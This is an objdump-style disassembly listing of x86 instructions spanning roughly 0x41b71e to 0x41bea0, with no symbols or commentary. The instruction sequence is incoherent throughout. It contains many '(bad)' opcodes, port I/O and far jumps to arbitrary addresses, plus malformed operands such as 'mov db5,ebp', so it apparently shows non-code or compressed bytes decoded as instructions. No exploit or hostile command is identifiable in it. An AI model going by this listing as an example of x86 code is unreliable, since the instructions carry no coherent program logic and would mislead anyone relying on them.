  41b71e:	and    al,0x68
  41b720:	jle    0x41b6ee
  41b722:	fist   WORD PTR [ecx-0x755c1c29]
  41b728:	xlat   BYTE PTR ds:[ebx]
  41b729:	out    0xe,al
  41b72b:	stc    
  41b72c:	repz xchg edx,eax
  41b72e:	fistp  QWORD PTR [ecx+0x15]
  41b731:	div    BYTE PTR [bp+si-0x29]
  41b735:	(bad)  
  41b736:	push   eax
  41b737:	outs   dx,BYTE PTR ds:[esi]
  41b738:	xlat   BYTE PTR ds:[ebx]
  41b739:	jge    0x41b75c
  41b73b:	jne    0x41b75f
  41b73d:	out    0x3,eax
  41b73f:	push   0x51e0da84
  41b744:	xlat   BYTE PTR ds:[ebx]
  41b745:	and    ecx,DWORD PTR [edx]
  41b747:	add    BYTE PTR [eax],al
  41b749:	add    BYTE PTR [eax],al
  41b74b:	add    BYTE PTR [ebp-0x4f118fe],dl
  41b751:	rcl    BYTE PTR [ecx-0x21],cl
  41b754:	cmp    DWORD PTR ds:0x27523fe,edx
  41b75a:	test   BYTE PTR [edi-0x20c224ee],0x5f
  41b761:	aaa    
  41b762:	add    BYTE PTR [ecx],cl
  41b764:	jno    0x41b768
  41b766:	or     eax,0xfcda3465
  41b76b:	es push esp
  41b76d:	add    dh,BYTE PTR [eax]
  41b76f:	jmp    0x145796ea
  41b774:	sbb    dl,dh
  41b776:	cmp    BYTE PTR [edi+0x10810562],ch
  41b77c:	aam    0xd5
  41b77e:	cld    
  41b77f:	out    dx,al
  41b780:	or     BYTE PTR [edx],al
  41b782:	inc    ecx
  41b783:	push   0xffffffb9
  41b785:	or     BYTE PTR ds:0xfcda146b,cl
  41b78b:	out    0xf7,al
  41b78d:	into   
  41b78e:	or     ch,dh
  41b790:	clc    
  41b791:	sar    bl,0xd6
  41b794:	fwait
  41b795:	sbb    eax,DWORD PTR [ebx+0xd0276e9]
  41b79b:	ins    DWORD PTR es:[edi],dx
  41b79c:	add    ebx,ebx
  41b79e:	cld    
  41b79f:	mov    esi,0xe9201d55
  41b7a4:	jbe    0x41b7ab
  41b7a6:	xchg   BYTE PTR [edi-0x51],cl
  41b7a9:	aad    0xfc
  41b7ab:	in     al,0x59
  41b7ad:	and    al,BYTE PTR [eax]
  41b7af:	jmp    0x41b7b4
  41b7b4:	add    BYTE PTR [ebx-0x80],dh
  41b7b7:	sahf   
  41b7b8:	xchg   ebp,eax
  41b7b9:	fwait
  41b7ba:	aad    0xe6
  41b7bc:	pop    edi
  41b7bd:	dec    edi
  41b7be:	xlat   BYTE PTR ds:[ebx]
  41b7bf:	cld    
  41b7c0:	ret    0x66a8
  41b7c3:	or     eax,0xfcd91a6a
  41b7c8:	jbe    0x41b835
  41b7ca:	mov    WORD PTR [eax],es
  41b7cc:	sub    dh,dh
  41b7ce:	int    0x9
  41b7d0:	div    ah
  41b7d2:	jg     0x41b7cf
  41b7d4:	pop    esi
  41b7d5:	and    eax,DWORD PTR [ebx+0x7c6be4f7]
  41b7db:	ins    BYTE PTR es:[edi],dx
  41b7dc:	push   edx
  41b7dd:	push   ebx
  41b7de:	xlat   BYTE PTR ds:[ebx]
  41b7df:	cmp    al,BYTE PTR [eax]
  41b7e1:	cdq    
  41b7e2:	add    DWORD PTR [eax],eax
  41b7e4:	add    BYTE PTR [ebx],dl
  41b7e6:	jle    0x41b848
  41b7e8:	sti    
  41b7e9:	arpl   WORD PTR [ecx+edi*1-0x183d9],si
  41b7f0:	push   cs
  41b7f1:	call   0x2522:0x63fffc5c
  41b7f8:	and    BYTE PTR [edx+eax*1],cl
  41b7fb:	or     eax,DWORD PTR [edi-0x449e0]
  41b801:	test   DWORD PTR [esi-0x9],eax
  41b804:	jmp    ebx
  41b806:	pop    es
  41b807:	mov    dh,0x47
  41b809:	int    0x4
  41b80b:	mov    dh,0x4f
  41b80d:	fidivr WORD PTR [esi-0x3f38f724]
  41b813:	(bad)  
  41b814:	mov    edi,0x88ffbf4f
  41b819:	add    BYTE PTR [eax],al
  41b81b:	add    BYTE PTR [eax],al
  41b81d:	add    BYTE PTR [ecx-0x53bac852],cl
  41b823:	xor    al,0xf
  41b825:	mov    esp,DWORD PTR [edx-0xe]
  41b828:	mov    BYTE PTR [ecx*1-0x2a7afb75],al
  41b82f:	add    ecx,DWORD PTR ss:[ebx-0x2ed8f594]
  41b836:	out    0x5,eax
  41b838:	das    
  41b839:	rcl    BYTE PTR [ebp-0x758ab7f1],cl
  41b83f:	mov    dl,BYTE PTR [edx+0x6c]
  41b842:	aaa    
  41b843:	xchg   edx,eax
  41b844:	mov    bl,BYTE PTR ds:[ebx-0x78]
  41b848:	push   ecx
  41b849:	hlt    
  41b84a:	and    BYTE PTR [edi],bh
  41b84c:	or     eax,DWORD PTR [edx-0x1fa]
  41b852:	and    BYTE PTR [edx+0x76],cl
  41b855:	inc    esp
  41b856:	nop
  41b857:	inc    ebp
  41b858:	or     eax,DWORD PTR [edi-0x16e]
  41b85e:	jne    0x41b83c
  41b860:	xchg   edx,eax
  41b861:	push   esp
  41b862:	jns    0x41b85c
  41b864:	enter  0xb83b,0xcc
  41b868:	xchg   edx,eax
  41b869:	inc    esp
  41b86a:	ja     0x41b850
  41b86c:	je     0x41b82c
  41b86e:	in     al,dx
  41b86f:	popf   
  41b870:	in     al,dx
  41b871:	or     al,0xcb
  41b873:	jae    0x41b876
  41b875:	mov    edi,0xc807d314
  41b87a:	jb     0x41b8a9
  41b87c:	inc    ebx
  41b87d:	add    DWORD PTR [ebx+ecx*1],esi
  41b880:	or     al,0x9
  41b882:	add    BYTE PTR [eax],al
  41b884:	add    BYTE PTR [eax],al
  41b886:	add    BYTE PTR [edi-0x303b29f],dh
  41b88c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b88d:	fdiv   DWORD PTR [edx+0x6d]
  41b890:	inc    ebx
  41b891:	(bad)  
  41b893:	fimul  DWORD PTR [ebx-0x76]
  41b896:	inc    edx
  41b897:	int    0x5f
  41b899:	xor    eax,0x5a3f6f4
  41b89e:	jmp    0xbfd49d33
  41b8a3:	call   0x94c252ca
  41b8a8:	jmp    0xcbdb0336
  41b8ad:	call   0x6a00:0x442fd787
  41b8b4:	dec    ebp
  41b8b5:	sub    DWORD PTR [ecx+0x45042b1e],0x86e00dfc
  41b8bf:	cmp    BYTE PTR [ebx-0x1cff407b],ah
  41b8c5:	cwde   
  41b8c6:	cld    
  41b8c7:	jb     0x41b84e
  41b8c9:	pop    ebx
  41b8ca:	xchg   DWORD PTR [eax+0x72d18581],esi
  41b8d0:	pop    ebp
  41b8d1:	sub    dh,al
  41b8d3:	pop    edx
  41b8d4:	dec    ebp
  41b8d5:	adc    dl,dl
  41b8d7:	mov    bh,0x62
  41b8d9:	ss adc al,0x8e
  41b8dc:	add    dh,BYTE PTR [ecx]
  41b8de:	pop    edi
  41b8df:	xchg   ebx,eax
  41b8e0:	rcl    ebx,cl
  41b8e2:	sti    
  41b8e3:	in     eax,dx
  41b8e4:	sub    eax,0xd2a7dc5b
  41b8e9:	popa   
  41b8ea:	lds    eax,FWORD PTR [eax]
  41b8ec:	add    BYTE PTR [eax],al
  41b8ee:	add    BYTE PTR [eax],al
  41b8f0:	std    
  41b8f1:	(bad)  
  41b8f2:	dec    esi
  41b8f3:	imul   edx,DWORD PTR [eax],0xda863dd4
  41b8f9:	add    ebp,DWORD PTR [ebx+0x56]
  41b8fc:	data16 add ah,bh
  41b8ff:	add    BYTE PTR [esi+0x694625ce],ch
  41b905:	xchg   DWORD PTR [ebx+0x133d3df7],esp
  41b90b:	pop    ebp
  41b90c:	int    0x87
  41b90e:	(bad)  
  41b911:	cmp    eax,0x3ad17ff
  41b916:	arpl   dx,bp
  41b918:	leave  
  41b919:	shl    ebp,cl
  41b91b:	jg     0x41b96c
  41b91d:	out    0xe6,al
  41b91f:	or     al,0xf1
  41b921:	xchg   ebp,eax
  41b922:	cli    
  41b923:	add    esi,DWORD PTR [ebp-0x79]
  41b926:	and    ebx,eax
  41b928:	repz cmp eax,0x1e378efb
  41b92e:	daa    
  41b92f:	lea    esi,[edi]
  41b931:	push   ds
  41b932:	pop    ss
  41b933:	in     eax,dx
  41b934:	clc    
  41b935:	out    dx,al
  41b936:	out    0x3,al
  41b938:	cwde   
  41b939:	dec    ebp
  41b93a:	iret   
  41b93b:	mov    fs,WORD PTR [edi]
  41b93d:	into   
  41b93e:	lods   eax,DWORD PTR ds:[esi]
  41b93f:	push   ecx
  41b940:	test   DWORD PTR [edi-0x15527054],eax
  41b946:	cmc    
  41b947:	jmp    0x7e81:0xc46bd379
  41b94e:	enter  0x6af0,0xd3
  41b952:	jmp    0x41b98f
  41b957:	add    BYTE PTR [eax],al
  41b959:	imul   ebp,ecx,0xd359eb50
  41b95f:	jmp    DWORD PTR [ebx-0x4a]
  41b962:	rol    DWORD PTR [ecx+0x427b90a6],cl
  41b968:	pop    ebp
  41b969:	repz std 
  41b96b:	cmp    esp,DWORD PTR [edi-0x5dc39860]
  41b971:	les    edx,FWORD PTR [edi]
  41b973:	cmp    al,0x9c
  41b975:	(bad)  
  41b976:	pop    edi
  41b977:	or     eax,0x30fe667f
  41b97c:	xor    BYTE PTR [ebp+0x47],bh
  41b97f:	or     eax,0xd00b67f
  41b984:	push   ebp
  41b985:	xor    BYTE PTR [edx+ecx*2+0x15],bh
  41b989:	outs   dx,BYTE PTR ds:[esi]
  41b98a:	mov    WORD PTR [eax+ebp*8+0x31],cs
  41b98e:	mov    ah,0x7
  41b990:	loop   0x41b950
  41b992:	add    eax,0x9373a6b6
  41b997:	fcomip st,st(1)
  41b999:	jae    0x41b95b
  41b99b:	xchg   BYTE PTR [edx+eax*8+0x25f1427b],ch
  41b9a2:	or     bh,BYTE PTR [eax+0x7cd5afee]
  41b9a8:	jo     0x41b9df
  41b9aa:	fiadd  DWORD PTR [eax+0x34e975a6]
  41b9b0:	out    0x4,al
  41b9b2:	xchg   ebx,eax
  41b9b3:	mov    ah,BYTE PTR [ecx]
  41b9b5:	or     eax,DWORD PTR [edx+0x47f1e8de]
  41b9bb:	in     al,dx
  41b9bc:	out    dx,al
  41b9bd:	add    BYTE PTR [eax],al
  41b9bf:	add    BYTE PTR [eax],al
  41b9c1:	add    ah,bh
  41b9c3:	jp     0x41b966
  41b9c5:	inc    edx
  41b9c6:	cmp    DWORD PTR [edx],eax
  41b9c8:	or     eax,0x68a8f66f
  41b9cd:	sub    DWORD PTR [ecx+0x3d],edi
  41b9d0:	xchg   DWORD PTR [ebx*4-0xa6ebd85],ebp
  41b9d7:	xchg   ecx,eax
  41b9d8:	jb     0x41b9d5
  41b9da:	push   cs
  41b9db:	iret   
  41b9dc:	cld    
  41b9dd:	add    bl,bh
  41b9df:	sub    al,0xe7
  41b9e1:	or     BYTE PTR [edi],bl
  41b9e3:	mov    edi,0x7f1d8b3d
  41b9e8:	dec    ecx
  41b9e9:	cld    
  41b9ea:	aad    0x42
  41b9ec:	clc    
  41b9ed:	xor    edi,DWORD PTR [esi+0x47]
  41b9f0:	test   DWORD PTR [ebp+0x40],edx
  41b9f3:	icebp  
  41b9f4:	leave  
  41b9f5:	jl     0x41b989
  41b9f7:	icebp  
  41b9f8:	pop    ebp
  41b9f9:	ins    BYTE PTR es:[edi],dx
  41b9fa:	dec    ebx
  41b9fb:	mov    DWORD PTR [edi+0xbacbbfb],eax
  41ba01:	mov    dh,0xf
  41ba03:	add    esp,0xdd886e33
  41ba09:	pop    es
  41ba0a:	ficomp WORD PTR [eax-0x3e367422]
  41ba10:	mov    ebp,0x800fe8
  41ba15:	or     BYTE PTR [edi],bl
  41ba17:	push   edx
  41ba18:	int    0xf
  41ba1a:	push   eax
  41ba1b:	adc    dl,bh
  41ba1d:	(bad)  
  41ba1e:	jnp    0x41b9cc
  41ba20:	inc    ecx
  41ba21:	adc    al,0x67
  41ba23:	cmp    bh,ah
  41ba25:	cmp    DWORD PTR [eax],eax
  41ba27:	add    BYTE PTR [eax],al
  41ba29:	add    BYTE PTR [eax],al
  41ba2b:	sbb    edx,esp
  41ba2d:	jp     0x41b9fc
  41ba2f:	push   edi
  41ba30:	inc    edx
  41ba31:	clc    
  41ba32:	cmp    eax,DWORD PTR [esp+edi*8]
  41ba35:	sbb    ebx,0xffffffaa
  41ba38:	stos   DWORD PTR es:[edi],eax
  41ba39:	sti    
  41ba3a:	or     DWORD PTR [ecx-0x26],0xfffffffc
  41ba3e:	mov    BYTE PTR [ecx-0x2d7bf42e],cl
  41ba44:	sar    ah,cl
  41ba46:	jmp    DWORD PTR [edi]
  41ba48:	adc    DWORD PTR [eax+eax*2],esp
  41ba4b:	adc    eax,0xb5502411
  41ba50:	popa   
  41ba51:	adc    DWORD PTR [eax],eax
  41ba53:	mov    WORD PTR [esi+0x42],?
  41ba56:	ins    BYTE PTR es:[edi],dx
  41ba57:	lahf   
  41ba58:	mov    esp,0x1a75c327
  41ba5d:	sbb    edi,DWORD PTR [edi+0x131c2f7a]
  41ba63:	jne    0x41ba40
  41ba65:	mov    al,BYTE PTR [eax]
  41ba67:	mov    dh,0xc3
  41ba69:	aas    
  41ba6a:	inc    DWORD PTR [ebx+0x4afa075e]
  41ba70:	pusha  
  41ba71:	jmp    0xd7aa00eb
  41ba76:	mov    BYTE PTR [ebx+0x5ec713bf],dh
  41ba7c:	sbb    al,0x41
  41ba7e:	cmp    DWORD PTR [eax+esi*4],esi
  41ba81:	test   BYTE PTR [eax+ecx*4],dl
  41ba84:	fild   DWORD PTR [eax]
  41ba86:	or     eax,0x458babe3
  41ba8b:	inc    ebp
  41ba8c:	call   0x42071f
  41ba91:	add    BYTE PTR [eax],al
  41ba93:	add    BYTE PTR [ebp+eiz*2-0x10],dh
  41ba97:	add    DWORD PTR [esi+0xffeece3],esi
  41ba9d:	or     eax,0xda3ab607
  41baa2:	pop    es
  41baa3:	mov    dh,0x3a
  41baa5:	ffree  st(1)
  41baa7:	fild   QWORD PTR [ebp-0x2c]
  41baaa:	rol    DWORD PTR [esi-0x3b7c30d0],0x76
  41bab1:	add    al,0x56
  41bab3:	lds    esi,FWORD PTR [eax]
  41bab5:	retf   
  41bab6:	add    DWORD PTR [eax],eax
  41bab8:	jne    0x41ba95
  41baba:	pop    es
  41babb:	mov    dh,0x32
  41babd:	fiadd  DWORD PTR [edi]
  41babf:	mov    dh,0x4a
  41bac1:	fld    QWORD PTR [ebx-0x3e25569e]
  41bac7:	fild   QWORD PTR [ebp-0x2c]
  41baca:	ret    0xc730
  41bacd:	pop    edx
  41bace:	fisub  DWORD PTR ds:0x86c32f82
  41bad4:	and    BYTE PTR [edi+0x1f6d5eb],cl
  41bada:	or     al,0xd8
  41badc:	jp     0x41baa5
  41bade:	and    edx,esp
  41bae0:	jae    0x41bab2
  41bae2:	out    0x3,al
  41bae4:	mov    al,0xdb
  41bae6:	rcl    BYTE PTR [esi*1+0x653e7043],1
  41baed:	jp     0x41bb12
  41baef:	fcomp  DWORD PTR [ebp-0x2b]
  41baf2:	imul   ebx,DWORD PTR [esi+0x49],0xc3ba03
  41baf9:	add    BYTE PTR [eax],al
  41bafb:	add    BYTE PTR [eax],al
  41bafd:	cmp    BYTE PTR [ecx-0x55],0xd3
  41bb01:	mov    cl,0xdb
  41bb03:	add    eax,0x69e1ba87
  41bb08:	loop   0x41bb35
  41bb0a:	jnp    0x41baa7
  41bb0c:	out    0x71,eax
  41bb0e:	nop
  41bb0f:	outs   dx,BYTE PTR ds:[esi]
  41bb10:	retf   0x428d
  41bb13:	out    0x8,eax
  41bb15:	rol    DWORD PTR [edx+0x2b56c17],cl
  41bb1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb1c:	mov    ch,BYTE PTR [edi-0x2c19032]
  41bb22:	test   DWORD PTR [esi],esp
  41bb24:	dec    esi
  41bb25:	jge    0x41bab1
  41bb27:	adc    eax,0x604fe9d8
  41bb2c:	ds (bad) 
  41bb2f:	cmp    al,0xf0
  41bb31:	xor    eax,ebx
  41bb33:	mov    ds:0x9b7ad3fb,eax
  41bb38:	iret   
  41bb39:	jns    0x41bac1
  41bb3b:	add    al,BYTE PTR [ebx]
  41bb3d:	jne    0x41bb41
  41bb3f:	jb     0x41bb87
  41bb41:	test   edi,edi
  41bb43:	xchg   esp,eax
  41bb44:	or     BYTE PTR [edx+0x3f8db913],al
  41bb4a:	(bad)  
  41bb4b:	popa   
  41bb4c:	dec    ecx
  41bb4d:	mov    eax,ds:0x81317044
  41bb52:	or     esi,DWORD PTR [ecx-0x24a1a8]
  41bb58:	jmp    0xf2836fc4
  41bb5d:	dec    eax
  41bb5e:	pop    esi
  41bb5f:	or     eax,0x6a
  41bb64:	add    BYTE PTR [eax],al
  41bb66:	cmp    al,0xf6
  41bb68:	(bad)  
  41bb69:	call   0x625253e9
  41bb6e:	mov    bl,0x12
  41bb70:	or     eax,0x40fc6d57
  41bb75:	shr    BYTE PTR [ebp+0x46640cd6],0xd8
  41bb7c:	cld    
  41bb7d:	jbe    0x41bba1
  41bb7f:	inc    esp
  41bb80:	adc    al,0x62
  41bb82:	lods   al,BYTE PTR ds:[esi]
  41bb83:	into   
  41bb84:	ss mov ah,0x4a
  41bb87:	dec    ebp
  41bb88:	shl    DWORD PTR [edx],cl
  41bb8a:	inc    ecx
  41bb8b:	inc    BYTE PTR [ebx-0x331e381]
  41bb91:	push   0xffffffbc
  41bb93:	fdivp  st(7),st
  41bb95:	cmc    
  41bb96:	cmc    
  41bb97:	cmp    BYTE PTR [ecx+ebp*8],dl
  41bb9a:	jbe    0x41bb23
  41bb9c:	pop    edx
  41bb9d:	xor    eax,0xed7aba6e
  41bba2:	icebp  
  41bba3:	cmp    edx,DWORD PTR [edx+eiz*8]
  41bba6:	inc    eax
  41bba7:	pop    esi
  41bba8:	jno    0x41bbad
  41bbaa:	jp     0x41bb44
  41bbac:	adc    BYTE PTR [edx+0x33],ah
  41bbaf:	adc    cl,BYTE PTR ds:0x36fc6d57
  41bbb5:	mov    ah,0xaa
  41bbb7:	push   ebx
  41bbb8:	and    ebp,DWORD PTR [edx-0x4febbc55]
  41bbbe:	xor    eax,0xce0a7bf6
  41bbc3:	call   0x835eeb50
  41bbc8:	mov    edi,0x55
  41bbcd:	add    BYTE PTR [eax],al
  41bbcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbd0:	or     DWORD PTR [ebx-0x1f],ebx
  41bbd3:	cmp    BYTE PTR [eax],al
  41bbd5:	xor    DWORD PTR [eax+0x4d8739],esp
  41bbdb:	push   eax
  41bbdc:	jmp    0x41bb9a
  41bbde:	mov    db5,ebp
  41bbe1:	cmc    
  41bbe2:	inc    ebx
  41bbe4:	cmp    DWORD PTR [ecx-0x10],0xffffff8c
  41bbe8:	pop    es
  41bbe9:	cmp    DWORD PTR [edi],0x3bfbb7e1
  41bbef:	mov    cl,0xaa
  41bbf1:	or     eax,DWORD PTR [edx-0x45644]
  41bbf7:	xlat   BYTE PTR ds:[ebx]
  41bbf8:	inc    edx
  41bbf9:	and    al,0x40
  41bbfb:	in     eax,0x42
  41bbfd:	and    al,0xff
  41bbff:	dec    ecx
  41bc00:	out    dx,al
  41bc01:	xchg   bh,dl
  41bc03:	jbe    0x41bc0b
  41bc05:	sti    
  41bc06:	jne    0x41bc38
  41bc08:	jns    0x41bbd1
  41bc0a:	call   FWORD PTR [ecx]
  41bc0c:	retf   0xff52
  41bc0f:	dec    ecx
  41bc10:	sar    bl,cl
  41bc12:	jne    0x41bc24
  41bc14:	mov    ch,0x71
  41bc16:	or     BYTE PTR [ebx+edx*4+0x38b3ffe8],dh
  41bc1d:	add    eax,0x16cd8323
  41bc23:	sbb    al,0x2
  41bc25:	aaa    
  41bc26:	pop    ebp
  41bc27:	push   eax
  41bc28:	xor    ah,dl
  41bc2a:	jmp    0x3d6613
  41bc2f:	addr16 cmp bh,ah
  41bc32:	mov    DWORD PTR [eax],0x0
  41bc38:	sbb    esi,ebx
  41bc3a:	std    
  41bc3b:	dec    esp
  41bc3d:	add    DWORD PTR [edi-0x7],edi
  41bc40:	int    0x35
  41bc42:	sbb    eax,0xb65f23b
  41bc47:	cmp    ebp,0xffffffae
  41bc4a:	sti    
  41bc4b:	jmp    DWORD PTR [ebx-0x6abcf881]
  41bc51:	inc    ebp
  41bc52:	hlt    
  41bc53:	nop    DWORD PTR [ebx-0x8]
  41bc57:	push   DWORD PTR [ebp-0x4c]
  41bc5a:	rol    BYTE PTR [edx-0x77],cl
  41bc5d:	pusha  
  41bc5e:	inc    ebp
  41bc5f:	cld    
  41bc60:	pop    esp
  41bc61:	push   ss
  41bc62:	lock jge 0x41bc17
  41bc65:	add    ah,cl
  41bc67:	or     al,0xf1
  41bc69:	popf   
  41bc6a:	out    0xfc,eax
  41bc6c:	sbb    BYTE PTR [eax+0x55],0xec
  41bc70:	jne    0x41bcc4
  41bc72:	inc    ebp
  41bc73:	adc    al,0x82
  41bc75:	stos   WORD PTR es:[edi],ax
  41bc77:	adc    BYTE PTR [ebp-0x25],dh
  41bc7a:	mov    DWORD PTR [edx+0x61],ebx
  41bc7d:	mov    al,0xc8
  41bc7f:	jp     0x41bc28
  41bc81:	shl    BYTE PTR [edx],0x6c
  41bc84:	(bad)  
  41bc85:	test   al,0x3
  41bc87:	mov    dh,0x7e
  41bc89:	xchg   edx,eax
  41bc8a:	inc    ebp
  41bc8b:	hlt    
  41bc8c:	enter  0x3fc6,0xfd
  41bc90:	mov    al,0xcf
  41bc92:	sbb    DWORD PTR [ebx-0x77],eax
  41bc95:	scas   eax,DWORD PTR es:[edi]
  41bc96:	out    0xe8,al
  41bc98:	(bad)  
  41bc99:	pusha  
  41bc9a:	ds jl  0x41bc9d
  41bc9d:	add    BYTE PTR [eax],al
  41bc9f:	add    BYTE PTR [eax],al
  41bca1:	clc    
  41bca2:	sbb    dl,BYTE PTR [eax+0x11]
  41bca5:	pop    esi
  41bca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bca7:	or     BYTE PTR [esi-0x7d],dh
  41bcaa:	enter  0x3ec9,0xfc
  41bcae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcaf:	xor    al,0x39
  41bcb1:	xor    al,0xac
  41bcb3:	sbb    DWORD PTR [edx],0xfffffffc
  41bcb6:	and    edx,ebx
  41bcb8:	xor    BYTE PTR [eax-0x15],0x3
  41bcbc:	or     eax,0xfce46cf0
  41bcc1:	loop   0x41bc72
  41bcc3:	xor    eax,0xab596afc
  41bcc8:	hlt    
  41bcc9:	ror    bl,cl
  41bccb:	xchg   DWORD PTR [edx-0x6f],eax
  41bcce:	fwait
  41bccf:	mov    DWORD PTR [edx-0x67],eax
  41bcd2:	fmul   QWORD PTR [ebp+0x24]
  41bcd5:	out    dx,al
  41bcd6:	add    DWORD PTR [esi+0x53cd7569],edi
  41bcdc:	clc    
  41bcdd:	std    
  41bcde:	mov    eax,0x347d4ed5
  41bce3:	into   
  41bce4:	dec    esi
  41bce5:	test   ebp,ecx
  41bce7:	cmp    ecx,DWORD PTR [eax]
  41bce9:	nop
  41bcea:	push   esi
  41bceb:	out    dx,eax
  41bcec:	jmp    0x41bd61
  41bcee:	fidiv  WORD PTR [ebp-0x5978d22c]
  41bcf4:	add    al,0xf6
  41bcf6:	stc    
  41bcf7:	cld    
  41bcf8:	add    esi,DWORD PTR [ebp+0x7]
  41bcfb:	cmp    al,0xd8
  41bcfd:	in     eax,0xb6
  41bcff:	jg     0x41bd75
  41bd01:	imul   ecx,esp,0x188d
  41bd07:	add    BYTE PTR [eax],al
  41bd09:	add    BYTE PTR [ebx+0x1980f65e],bh
  41bd0f:	retf   
  41bd10:	jge    0x41bce6
  41bd12:	jns    0x41bca8
  41bd14:	loope  0x41bd56
  41bd16:	dec    ebx
  41bd17:	inc    esi
  41bd18:	iret   
  41bd19:	add    al,cl
  41bd1b:	out    0x71,eax
  41bd1d:	cmp    eax,0x2c94fb65
  41bd22:	sub    bh,BYTE PTR [edx-0x1e]
  41bd25:	or     esi,esp
  41bd27:	ret    
  41bd28:	call   0xf6422648
  41bd2d:	jle    0x41bdad
  41bd2f:	fidivr WORD PTR ds:0x3e5213d4
  41bd35:	aam    0x1
  41bd37:	cld    
  41bd38:	je     0x41bd76
  41bd3a:	cli    
  41bd3b:	sub    BYTE PTR ds:0x11c1ac01,0xe9
  41bd42:	jns    0x41bcd8
  41bd44:	lods   eax,DWORD PTR ds:[esi]
  41bd45:	add    dh,BYTE PTR [eax-0x6c]
  41bd48:	popf   
  41bd49:	add    DWORD PTR [edx],ebx
  41bd4b:	jecxz  0x41bd3b
  41bd4d:	or     BYTE PTR [edx],dl
  41bd4f:	jp     0x41bcf4
  41bd51:	xlat   BYTE PTR ds:[ebx]
  41bd52:	cmc    
  41bd53:	ret    
  41bd54:	(bad)  
  41bd55:	jmp    0xe9413e29
  41bd5a:	jbe    0x41bd59
  41bd5c:	mov    ch,0x2e
  41bd5e:	js     0x41bd5d
  41bd60:	mov    ch,0x36
  41bd62:	jae    0x41bce5
  41bd64:	(bad)  
  41bd65:	aad    0x79
  41bd67:	mov    ebx,edi
  41bd69:	loope  0x41bd06
  41bd6b:	shl    DWORD PTR [eax],0x9b
  41bd6e:	add    BYTE PTR [eax],al
  41bd70:	add    BYTE PTR [eax],al
  41bd72:	add    cl,bh
  41bd74:	aam    0x30
  41bd76:	out    dx,al
  41bd77:	add    al,cl
  41bd79:	xchg   BYTE PTR [edx*4+0xc6ad9da],bl
  41bd80:	into   
  41bd81:	jmp    FWORD PTR [ebp-0x17012d44]
  41bd87:	jbe    0x41bd8b
  41bd89:	inc    ebp
  41bd8a:	sbb    BYTE PTR [ebp-0x27d63fef],0x40
  41bd91:	lock jo 0x41bd50
  41bd94:	into   
  41bd95:	call   0xfca1b015
  41bd9a:	jmp    0x6081800a
  41bd9f:	lods   al,BYTE PTR ds:[esi]
  41bda0:	rol    BYTE PTR [edx+edx*2-0x48],cl
  41bda4:	std    
  41bda5:	mov    ch,0xa6
  41bda7:	jno    0x41bda6
  41bda9:	mov    ch,0xa6
  41bdab:	js     0x41bd2e
  41bdad:	bound  ecx,QWORD PTR [ebp+0x71]
  41bdb0:	mov    ebx,edi
  41bdb2:	icebp  
  41bdb3:	aas    
  41bdb4:	inc    eax
  41bdb5:	lock call 0xe241c031
  41bdbb:	cmp    edx,ebx
  41bdbd:	cdq    
  41bdbe:	pop    esp
  41bdbf:	cmp    DWORD PTR [esi-0x7c87f780],esi
  41bdc5:	dec    edx
  41bdc6:	or     eax,0x55878c76
  41bdcb:	inc    edx
  41bdcc:	inc    edx
  41bdcd:	add    dh,bl
  41bdcf:	add    al,0x4b
  41bdd1:	les    eax,FWORD PTR [eax]
  41bdd3:	out    0x3e,eax
  41bdd5:	add    BYTE PTR [edi+0x0],al
  41bdd8:	add    BYTE PTR [eax],al
  41bdda:	add    BYTE PTR [eax],al
  41bddc:	inc    ebp
  41bddd:	inc    ecx
  41bdde:	cld    
  41bddf:	mov    DWORD PTR [ecx],edx
  41bde1:	mov    bh,0x81
  41bde3:	rol    BYTE PTR [ecx-0x39],0xb4
  41bde7:	call   FWORD PTR [ebx+0x51897baf]
  41bded:	mov    esi,0x37a3b60b
  41bdf2:	test   BYTE PTR [ebp-0x5c],0x5
  41bdf6:	test   DWORD PTR [ebp-0x30],edx
  41bdf9:	inc    DWORD PTR [ebx-0x1631c]
  41bdff:	mov    bl,BYTE PTR [edx-0xa]
  41be02:	or     dh,BYTE PTR [esi-0x2dd02a68]
  41be08:	in     eax,0x42
  41be0a:	hlt    
  41be0b:	mov    ebx,DWORD PTR [ecx-0x5e76c14e]
  41be11:	retf   0xca37
  41be14:	push   0xf03e723
  41be19:	nop
  41be1a:	cmp    ebp,DWORD PTR ds:[edx+0x62]
  41be1e:	or     eax,DWORD PTR [ebx-0x330ee]
  41be24:	sbb    ebp,DWORD PTR [edi+ecx*1-0x75]
  41be28:	jmp    0x3fc8:0x18b60af5
  41be2f:	cmp    ecx,ebx
  41be31:	mov    cl,0xb
  41be33:	test   BYTE PTR [eax],ch
  41be35:	lods   al,BYTE PTR ds:[esi]
  41be36:	sti    
  41be37:	(bad)  
  41be38:	mov    ebx,0xd98b143a
  41be3d:	mov    ecx,0x4d35
  41be42:	add    BYTE PTR [eax],al
  41be44:	add    BYTE PTR [eax],ah
  41be46:	xor    al,0xd1
  41be48:	cmp    edx,DWORD PTR [esp+eax*1-0x7c]
  41be4c:	inc    DWORD PTR [esi+0x983fbb4]
  41be52:	stos   BYTE PTR es:[edi],al
  41be53:	cld    
  41be54:	mov    BYTE PTR [ebp-0x62],dh
  41be57:	hlt    
  41be58:	or     al,0xf0
  41be5a:	xor    edx,0x3052d2ff
  41be60:	cld    
  41be61:	mov    ss,WORD PTR [ebx]
  41be63:	push   eax
  41be64:	aaa    
  41be65:	jle    0x41bed8
  41be67:	pop    esp
  41be68:	jno    0x41bec9
  41be6a:	test   al,0x96
  41be6c:	adc    dh,bh
  41be6e:	adc    DWORD PTR [ecx*1+0x36fad7e3],edx
  41be75:	xor    BYTE PTR [edi-0x47c9dca9],ah
  41be7b:	inc    esp
  41be7c:	adc    al,0x4c
  41be7e:	push   ss
  41be7f:	clc    
  41be80:	jnp    0x41be18
  41be82:	mov    ah,0xed
  41be84:	mov    BYTE PTR [ebx],bh
  41be86:	jne    0xbedc04b
  41be8c:	pop    ebx
  41be8d:	jge    0x41be78
  41be8f:	add    DWORD PTR [ecx],esi
  41be91:	cmp    al,0x1a
  41be93:	jns    0x41bee2
  41be95:	shl    DWORD PTR [ecx+eax*8-0x291815f4],0xfc
  41be9d:	push   edx
  41be9e:	pop    esp
  41be9f:	dec    ebp
  41bea0:	lock jne 0x41be7b
